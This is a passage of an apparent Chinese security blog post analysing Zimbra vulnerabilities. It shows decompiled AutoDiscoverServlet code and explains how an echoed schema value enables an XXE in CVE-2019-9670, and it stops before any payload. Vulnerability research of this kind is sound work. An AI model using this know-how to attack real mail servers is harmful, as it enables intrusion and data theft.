<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CVE-2019-9670 zimbra XXE漏洞原理网上关于这个漏洞的审计似乎比较少，所以在分析漏洞原理的时候走了一些不必要的弯路。根据漏洞披露出的细节来看，在&#x2F;Autodiscover中存在CVE-2019-9670，查找zimbra-core中带有Autodicover的类名： find . -name “*.jar”|awk ‘{print “jar -tvf “$1}’ |">
<meta property="og:type" content="article">
<meta property="og:title" content="Zimbra Exploit">
<meta property="og:url" content="https://blog.rainb0w.top/2023/03/17/zimbraExploit/index.html">
<meta property="og:site_name" content="rainb0w">
<meta property="og:description" content="CVE-2019-9670 zimbra XXE漏洞原理网上关于这个漏洞的审计似乎比较少，所以在分析漏洞原理的时候走了一些不必要的弯路。根据漏洞披露出的细节来看，在&#x2F;Autodiscover中存在CVE-2019-9670，查找zimbra-core中带有Autodicover的类名： find . -name “*.jar”|awk ‘{print “jar -tvf “$1}’ |">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg">
<meta property="article:published_time" content="2023-03-17T00:00:00.000Z">
<meta property="article:modified_time" content="2023-12-10T12:01:21.781Z">
<meta property="article:author" content="rainb0w">
<meta property="article:tag" content="security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Zimbra Exploit</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/04/04/kafkaJNDI/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/02/25/htbEncoding/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.rainb0w.top/2023/03/17/zimbraExploit/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&text=Zimbra Exploit"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&is_video=false&description=Zimbra Exploit"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Zimbra Exploit&body=Check out this article: https://blog.rainb0w.top/2023/03/17/zimbraExploit/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&name=Zimbra Exploit&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&t=Zimbra Exploit"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-9670-zimbra-XXE"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-9670 zimbra XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pocsuite-POC"><span class="toc-number">1.2.</span> <span class="toc-text">Pocsuite-POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-27925-Zimbra%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E7%9A%84RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">CVE-2022-27925 Zimbra路径穿越导致的RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%AE%BE%E7%BD%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text">调试设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pocsuite-POC-1"><span class="toc-number">2.2.</span> <span class="toc-text">Pocsuite-POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-41352-Zimbra-Unauthenticated-RCE"><span class="toc-number">3.</span> <span class="toc-text">CVE-2022-41352 Zimbra Unauthenticated RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pocsuite-POC-2"><span class="toc-number">3.2.</span> <span class="toc-text">Pocsuite-POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">3.3.</span> <span class="toc-text">运行结果</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Zimbra Exploit
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">rainb0w</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-17T00:00:00.000Z" class="dt-published" itemprop="datePublished">2023-03-17</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/security/" rel="tag">security</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2019-9670-zimbra-XXE"><a href="#CVE-2019-9670-zimbra-XXE" class="headerlink" title="CVE-2019-9670 zimbra XXE"></a>CVE-2019-9670 zimbra XXE</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>网上关于这个漏洞的审计似乎比较少，所以在分析漏洞原理的时候走了一些不必要的弯路。根据漏洞披露出的细节来看，在&#x2F;Autodiscover中存在CVE-2019-9670，查找zimbra-core中带有Autodicover的类名：</p>
<p>find . -name “*.jar”|awk ‘{print “jar -tvf “$1}’ | sh -x | grep -i Autodiscover</p>
<p>找到如下两个jar包：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg"></a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg"></a></p>
<p>可以看出nashorn.jar是jre的中的jar包，应该不是我们的目标，而AutoDiscoverServlet带有Servlet字样，应是对外提供服务的。（这里纠结了很久，其实大致浏览一下代码，就可以确定哪个才是目标）</p>
<p>拿出zimbrastore.jar放入IDEA或者jd-gui进行反编译，其中doPost部分如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    ZimbraLog.clearContext();</span><br><span class="line">    addRemoteIpToLoggingContext(req);</span><br><span class="line">    log.info(<span class="string">&quot;Handling autodiscover request...&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] reqBytes = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span>[] reqBytes = ByteUtil.getContent(req.getInputStream(), req.getContentLength());</span><br><span class="line">    <span class="keyword">if</span> (reqBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;No content found in the request&quot;</span>);</span><br><span class="line">        sendError(resp, <span class="number">600</span>, <span class="string">&quot;No content found in the request&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(reqBytes, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        log.debug(<span class="string">&quot;Request before auth: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">        String responseSchema;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            Enumeration&lt;String&gt; enm = req.getHeaderNames();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(enm.hasMoreElements()) &#123;</span><br><span class="line">                responseSchema = (String)enm.nextElement();</span><br><span class="line">                log.info(<span class="string">&quot;POST header: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;responseSchema + <span class="string">&quot;:&quot;</span> + req.getHeader(responseSchema)&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        responseSchema = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        DocumentBuilder respDoc;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">docBuilderFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            respDoc = docBuilderFactory.newDocumentBuilder();</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> respDoc.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(content)));</span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nList</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;Request&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nList.getLength(); ++i) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nList.item(i);</span><br><span class="line">                <span class="keyword">if</span> (node.getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> (Element)node;</span><br><span class="line">                    email = getTagValue(<span class="string">&quot;EMailAddress&quot;</span>, element);</span><br><span class="line">                    responseSchema = getTagValue(<span class="string">&quot;AcceptableResponseSchema&quot;</span>, element);</span><br><span class="line">                    <span class="keyword">if</span> (email != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;cannot parse body: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">            sendError(resp, <span class="number">400</span>, <span class="string">&quot;Body cannot be parsed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (email != <span class="literal">null</span> &amp;&amp; email.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (responseSchema != <span class="literal">null</span> &amp;&amp; responseSchema.length() &gt; <span class="number">0</span> &amp;&amp; !responseSchema.equals(<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006&quot;</span>) &amp;&amp; !responseSchema.equals(<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;</span>)) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Requested response schema not available &quot;</span> + responseSchema);</span><br><span class="line">                sendError(resp, <span class="number">503</span>, <span class="string">&quot;Requested response schema not available &quot;</span> + responseSchema);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Authenticating user&quot;</span>);</span><br><span class="line">                <span class="type">Account</span> <span class="variable">acct</span> <span class="operator">=</span> <span class="built_in">this</span>.authenticate(req, resp, responseSchema);</span><br><span class="line">                <span class="keyword">if</span> (acct != <span class="literal">null</span>) &#123;</span><br><span class="line">                    log.debug(<span class="string">&quot;Authentication finished successfully&quot;</span>);</span><br><span class="line">                    log.debug(<span class="string">&quot;content length: %d, content type: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req.getContentLength(), req.getContentType()&#125;);</span><br><span class="line">                    <span class="keyword">if</span> (req.getContentLength() != <span class="number">0</span> &amp;&amp; req.getContentType() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!AccountUtil.addressMatchesAccount(acct, email)) &#123;</span><br><span class="line">                                log.warn(email + <span class="string">&quot; doesn&#x27;t match account addresses for user &quot;</span> + acct.getName());</span><br><span class="line">                                sendError(resp, <span class="number">500</span>, email + <span class="string">&quot; doesn&#x27;t match account addresses&quot;</span>);</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ServiceException var16) &#123;</span><br><span class="line">                            log.warn(<span class="string">&quot;Account access error; user=&quot;</span> + acct.getName(), var16);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, <span class="string">&quot;Account access error; user=&quot;</span> + acct.getName());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        respDoc = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        String respDoc;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">serviceUrl</span> <span class="operator">=</span> getServiceUrl(acct, responseSchema);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">displayName</span> <span class="operator">=</span> acct.getDisplayName() == <span class="literal">null</span> ? email : acct.getDisplayName();</span><br><span class="line">                            <span class="keyword">if</span> (displayName.contains(<span class="string">&quot;@&quot;</span>)) &#123;</span><br><span class="line">                                displayName = displayName.substring(<span class="number">0</span>, displayName.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            log.debug(<span class="string">&quot;displayName: %s, email: %s, serviceUrl: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;displayName, email, serviceUrl&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (isEwsClient(responseSchema)) &#123;</span><br><span class="line">                                respDoc = createResponseDocForEws(displayName, email, serviceUrl, acct);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                respDoc = createResponseDoc(displayName, email, serviceUrl);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                            log.warn(var15);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, var15.getMessage());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        log.info(<span class="string">&quot;Response: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;respDoc&#125;);</span><br><span class="line">                        log.debug(<span class="string">&quot;response length: %d&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;respDoc.length()&#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ByteUtil.copy(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(respDoc.getBytes(<span class="string">&quot;UTF-8&quot;</span>)), <span class="literal">true</span>, resp.getOutputStream(), <span class="literal">false</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                            log.error(<span class="string">&quot;copy response error&quot;</span>, var14);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, var14.getMessage());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        log.debug(<span class="string">&quot;setting content type to text/xml&quot;</span>);</span><br><span class="line">                        resp.setContentType(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">                        log.info(<span class="string">&quot;sending autodiscover response...&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        log.warn(<span class="string">&quot;No suitable content found in the request&quot;</span>);</span><br><span class="line">                        sendError(resp, <span class="number">600</span>, <span class="string">&quot;No suitable content found in the request&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;No Email address is specified in the Request, %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">            sendError(resp, <span class="number">400</span>, <span class="string">&quot;No Email address is specified in the Request&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意如下部分：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg"></a></p>
<p>这里获取了我们传入的Request标签中的元素，将EMailAddress标签的值和AcceptableResponseSchema标签的值分别赋值给email和responseSchema，若email为空或responseSchema为空，则直接返回400状态码及Body cannot be parsed。</p>
<p>我们可以传入如下body，查看响应：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg" title="image-20230403125629868" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg" alt="image-20230403125629868"></a></p>
<p>此时就可以确认这个类是Autodiscover功能对应类。进入之后的if判断，代码如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg" title="image-20230403125818642" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg" alt="image-20230403125818642"></a></p>
<p>这里对responseSchema也就是AcceptableResponseSchema标签中的值进行了判断，若不等于<code>http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006</code>或者<code>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</code>则返回503以及Requested response schema not available再加上responseSchema的值。因此此处存在回显型xxe。假设传入如下xml：</p>
